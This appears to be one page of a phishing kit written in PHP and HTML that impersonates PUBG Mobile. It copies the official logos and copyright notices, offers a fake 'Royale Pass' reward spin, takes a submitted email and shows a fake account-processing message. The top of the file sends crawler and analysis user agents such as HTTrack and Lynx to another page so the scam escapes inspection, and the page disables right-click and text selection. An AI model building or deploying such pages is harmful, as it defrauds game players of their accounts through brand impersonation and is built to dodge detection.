<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="containerHome">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://www.pubgmobile.com/en/images/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="season-alert">
<img class="season-alert-img" src="https://www.pubgmobile.com/images/event/royalepassm5/kv_logo.png">
<div class="slider">
<div class="season-alert-title">Royale Pass Month 5: Mirror Realm</div> <!--- season-alert-title --->
</div> <!--- slider --->
<div class="slider">
<div class="season-alert-desc">Choose your free rewards here now!</div> <!--- season-alert-title --->
</div> <!--- slider --->
</div> <!--- season-alert --->
<div class="box">
<center>
<div class="wrap">
<div class="bg">
<div class="kotak">
<center>
<div class="spin">
<img class="img" src="img/rewards/1.png">
<img class="img" src="img/rewards/2.png">
<img class="img" src="img/rewards/3.png">
<img class="img" src="img/rewards/4.png">
<img class="img" src="img/rewards/5.png">
<img class="img" src="img/rewards/6.png">
</div> <!--- spin --->
</center>
<img onclick="spin()" class="start" src="img/putar.png">
</div> <!--- kotak --->
</div> <!--- bg --->
</div> <!--- wrap --->
<div class="btn-wrapper">
<button type="button" onmousedown="buka.play()" onclick="open_about_event()">About Event</button>
<button type="button" onmousedown="buka.play()" onclick="open_event_rules()">Event Rules</button>
</div> <!--- btn-wrapper --->
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2021 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Thank your for joining this event
<br>
<br>
Currently your account has been processing
<br>
Please wait up to 24 hours to receive your rewards
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-active" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/click.js"></script>

</body>
</html>